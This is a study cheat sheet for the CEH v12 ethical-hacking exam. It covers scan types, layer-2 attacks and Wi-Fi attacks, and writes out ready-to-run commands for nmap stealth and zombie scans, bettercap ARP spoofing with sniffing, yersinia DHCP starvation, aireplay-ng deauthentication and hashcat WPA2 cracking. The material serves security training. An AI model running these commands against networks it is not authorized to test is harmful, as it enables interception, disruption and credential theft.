# Certified Ethical Hacker (CEH v12) — Tactical Blueprint

## 1. Footprinting, Scanning & Network Enumeration

```
                  TCP THREE-WAY HANDSHAKE & SCAN PROFILES
       SYN Scan (-sS)                     FIN / NULL / Xmas Scan
 Attacker           Target            Attacker                Target
    │ ──── SYN ────>  │                  │ ── FIN/NULL/XMAS ─>   │
    │ <── SYN/ACK ──  │ (Open)           │ <──── RST/ACK ─────   │ (Closed)
    │ ──── RST ────>  │                  │ ──── (No Response) ─> │ (Open|Filtered)
```

### Advanced Nmap Flag Cheat Sheet
```bash
# TCP SYN Stealth Scan (Half-Open - Does not complete 3-way handshake)
nmap -sS -Pn -T4 -p- 192.168.1.0/24

# Xmas Scan (Sets FIN, PSH, and URG flags) - RFC 793 standard check
nmap -sX -p 21,22,80,445 192.168.1.50

# TCP ACK Scan (Used to map firewall rule sets and detect stateful filtering)
nmap -sA -p 80,443 192.168.1.50

# Idle Zombie Scan (Uses predictable IP ID sequence from an idle host)
nmap -sI zombie_host:80 target_ip
```

---

## 2. Sniffing, MITM & Layer 2 Attacks

### ARP Cache Poisoning (Ettercap & Bettercap)
```bash
# Bettercap ARP spoofing routing gateway traffic through attacker
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.100; set arp.spoof.internal true; arp.spoof on; net.sniff on"
```

### DHCP Starvation & Rogue DHCP Attacks
* Exhaust DHCP server lease pool by flooding random MAC address DHCP Discover packets using `yersinia dhcp -a -i eth0`.
* Deploy rogue DHCP server to assign attacker machine as default gateway and primary DNS server.

---

## 3. Web & Wireless Attack Methodologies

### WPA2/WPA3 4-Way Handshake Capture & Deauthentication
```bash
# Put interface in monitor mode
airmon-ng start wlan0

# Target BSSID and channel to capture 4-way EAPOL handshake
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Send targeted deauth frames to force client reconnection
aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# Crack captured WPA2 handshake using Hashcat (-m 22000 for PMKID / EAPOL)
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
```
